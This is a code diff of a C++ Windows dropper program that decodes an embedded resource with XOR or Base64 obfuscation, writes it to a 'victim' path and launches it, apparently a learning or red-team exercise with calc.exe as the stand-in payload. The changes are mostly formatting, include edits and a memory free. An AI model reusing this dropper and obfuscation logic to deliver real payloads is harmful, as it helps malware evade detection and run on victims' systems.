@@ -11,7 +11,9 @@
 #include"resource.h"	// Resources Definition
 #include<time.h>		// rand seed
 #include<map>
-#include <bits/stdc++.h>
+#include<string>
+#include<algorithm>
+#include<vector>
 
 // Imports for the dead code function
 #include<commctrl.h>
@@ -48,7 +50,7 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = (char*) "C:\\Users\\adind\\Dropper\\Walmart-version-of-Dropper\\calc.exe";
+char* victim_name = (char*)"C:\\Users\\adind\\source\\repos\\CppTest\\calc.exe";
 
 int xor_key = 115;
 
@@ -68,22 +70,20 @@ int main(int argc, char* argv[])
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
 #ifdef XOR_ENCODE
-		std::cout << "xor was executed in c++.";
-		data = XOR(data, size);
-		std::cout << "This is data (xor): " << data << std::endl;
-#endif
-#ifdef BASE64
-		std::cout << "base 64 was executed in c++";
-		data = base64decode(data, &size);
-		std::cout << "This is data (base64): " << data << std::endl;
+	std::cout << "xor was executed in c++.\n";
+	data = XOR(data, size);
 #endif
 
+#ifdef BASE64
+	std::cout << "base 64 was executed in c++.\n";
+	data = base64decode(data, &size);
+
+#endif
 	// where to drop
 	set_name();
 	// Drop to Disk
 	//
 	drop(size, data);
-
 	// process
 	launch();
 #ifdef DEAD_CODE
@@ -135,44 +135,44 @@ void launch()
 // Decode a Base64 String modified and  copied from geeks for geeks
 void* base64decode(void* data, DWORD* size)
 {
-    static const int decode_table[256] = {
-        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
-        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
-        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
-        52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
-        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
-        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
-        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
-        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
-    };
+	static const int decode_table[256] = {
+		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
+		52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
+		-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
+		15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
+		-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
+		41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
+	};
 
-    char* in = (char*)data;
-    size_t len = strlen(in);
+	char* in = (char*)data;
+	size_t len = strlen(in);
 
-    std::vector<uint8_t> out;
-    out.reserve(len * 3 / 4);
+	std::vector<uint8_t> out;
+	out.reserve(len * 3 / 4);
 
-    int val = 0;
-    int valb = -8;
+	int val = 0;
+	int valb = -8;
 
-    for (size_t i = 0; i < len; i++) {
-        unsigned char c = in[i];
-        if (decode_table[c] == -1) continue;
-        val = (val << 6) + decode_table[c];
-        valb += 6;
-        if (valb >= 0) {
-            out.push_back((val >> valb) & 0xFF);
-            valb -= 8;
-        }
-    }
+	for (size_t i = 0; i < len; i++) {
+		unsigned char c = in[i];
+		if (decode_table[c] == -1) continue;
+		val = (val << 6) + decode_table[c];
+		valb += 6;
+		if (valb >= 0) {
+			out.push_back((val >> valb) & 0xFF);
+			valb -= 8;
+		}
+	}
 
-    // allocate + null terminator
-    void* buffer = malloc(out.size() + 1);
-    memcpy(buffer, out.data(), out.size());
-    ((char*)buffer)[out.size()] = '\0';
-
-    *size = (DWORD)out.size();
-    return buffer;
+	// allocate + null terminator
+	void* buffer = malloc(out.size() + 1);
+	memcpy(buffer, out.data(), out.size());
+	((char*)buffer)[out.size()] = '\0';
+	char* contents = ((char*) &buffer);
+	*size = (DWORD)out.size();
+	return buffer;
 }
 
 
@@ -187,6 +187,7 @@ void* XOR(void* data, int size) {
 		((char*)buffer)[i] = ((char*)data)[i] ^ xor_key;
 		((char*)test)[i] = ((char*)buffer)[i];
 	}
+	free(test);
 	return buffer;
 }
 
